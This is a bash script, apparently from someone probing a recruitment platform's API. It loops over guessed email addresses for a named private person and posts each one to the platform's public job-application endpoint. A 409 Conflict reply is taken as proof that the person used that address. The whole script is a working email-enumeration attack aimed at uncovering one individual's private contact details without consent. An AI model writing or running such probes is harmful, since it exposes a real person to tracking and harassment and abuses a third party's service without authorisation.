#!/bin/bash
# Tentative de détection de l'email d'Aurore AKPOVI via l'endpoint public /apply
# Si l'email existe déjà → 409 Conflict (Email déjà utilisé pour ce job)
# Si l'email n'existe pas → on l'évite pour ne pas créer de fake candidat

TENANT_ID="4246cd3c-518a-44bb-a5e0-4109b8eca372"
JOB_ID="19ccbc49-1bfd-446b-a12c-d5c1418a821d"  # Professeur SVT (2 apps)

# Liste de patterns d'email probables pour "Aurore AKPOVI"
EMAILS=(
  "aurore.akpovi@gmail.com"
  "akpovi.aurore@gmail.com"
  "auroreakpovi@gmail.com"
  "aurore.akpovi@yahoo.fr"
  "akpovi.aurore@yahoo.fr"
  "aurore.akpovi@outlook.fr"
  "aurore.akpovi@hotmail.com"
  "a.akpovi@gmail.com"
  "aurose.akpovi@gmail.com"
  "aurorekapovi@gmail.com"
)

for email in "${EMAILS[@]}"; do
  # Use minimal payload — if email exists, we get 409 before any DB write
  # Apply is multipart/form-data, but we can send JSON if content-type is set
  # Actually the endpoint expects FormData with files (cv required)
  # So we use a simpler approach: just send empty form data
  response=$(curl -s -X POST "https://api.academiahelm.com/api/hr/recruitment/apply" \
    -F "firstName=Aurore" \
    -F "lastName=AKPOVI" \
    -F "email=$email" \
    -F "phone=00000000" \
    -F "tenantId=$TENANT_ID" \
    -F "jobId=$JOB_ID" \
    -m 15 2>&1)
  
  # Check if response contains "déjà soumis" or "Conflict" or 409
  if echo "$response" | grep -qiE "déjà soumis|Conflict|409"; then
    echo "✅ EMAIL TROUVÉ: $email"
    echo "Réponse: $response"
    break
  else
    code=$(echo "$response" | python3 -c "import sys,json; print(json.load(sys.stdin).get('statusCode','?'))" 2>/dev/null || echo "?")
    echo "❌ $email → status=$code"
  fi
done
